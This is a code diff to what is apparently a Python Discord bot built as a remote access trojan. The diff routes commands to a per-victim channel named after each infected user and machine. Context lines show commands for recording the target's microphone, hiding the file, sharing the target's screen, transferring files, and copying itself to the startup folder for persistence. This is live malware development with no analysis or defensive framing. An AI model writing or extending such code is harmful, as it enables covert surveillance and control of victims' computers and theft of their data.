@@ -20,6 +20,7 @@ clogger = Cliplogger()
 activeRecording = {}
 activeStreaming = {}
 prefix = '.'
+BOT_IDENTITY = set()
 
 def get_current_userAndMachine():
     user = os.getlogin()
@@ -429,21 +430,23 @@ async def stoprecord(ctx: commands.Context):
         await ctx.send("no active mic recording session here!")
 
 async def MakeandJoinGuild(guild):
-    bot_user, bot_machine = get_current_userAndMachine()
-    formatted_name = f"{bot_user}_{bot_machine}".lower().replace(" ", "-")
+    bot_user, bot_system = get_current_userAndMachine()
+    formatted_name = f"{bot_user}_{bot_system}".lower().replace(" ", "-")
     existing_ch = discord.utils.get(guild.text_channels, name=formatted_name)
 
     if not existing_ch:
         try:
             new_ch = await guild.create_text_channel(formatted_name)
             await new_ch.send("Hello! i'm ON!")
+            return new_ch
         except discord.Forbidden:
-            pass
+            return None
     else:
         try:
             await existing_ch.send("I'm ON!")
+            return existing_ch
         except discord.Forbidden:
-            pass
+            return None
 
 async def CopytoStartUpFolder(ctx: commands.Context):
     ScriptPath = os.path.abspath(sys.executable)
@@ -481,7 +484,7 @@ async def help(ctx: commands.Context):
         ".recordmic <time> :: record audio and save it\n"
         ".stoprecord :: stop audio recording and sends the result\n"
         ".hide      :: hides the file from file explorer\n"
-        ".screenshare <url-ngrok-http> :: share screen from target and view it in browser\n"
+        ".screenshare <url> :: share screen from target and view it in browser\n"
         ".stopsharing :: stop screenshare\n"
         "\n"
         "::FILE TRANSFER\n"
@@ -561,6 +564,12 @@ async def on_guild_join(guild):
 async def on_message(message):
     if message.author == bot.user:
         return
+
+    bot_user, bot_machine = get_current_userAndMachine()
+    formatted_name = f"{bot_user}_{bot_machine}".lower().replace(" ", "-")
+    if message.channel.name != formatted_name:
+        return
+    
     txt = message.content.strip()
 
     if txt.startswith(prefix):
@@ -610,13 +619,13 @@ async def on_message(message):
                 await recordmic(ctx, time=time)
         elif command == ".screenshare":
             if len(arg) < 1:
-                await ctx.send("wrong formatting, should be `.screenshare <ngrok-url>`")
+                await ctx.send("wrong formatting, should be `.screenshare <url>`")
                 return
 
             url = arg[0]
 
             if not url.startswith(("https://", "http://")):
-                await ctx.send("wrong formatting, should be `.screenshare <ngrok-url>`")
+                await ctx.send("wrong formatting, should be `.screenshare <url>`")
                 return
 
             if ctx.channel.id in activeStreaming:
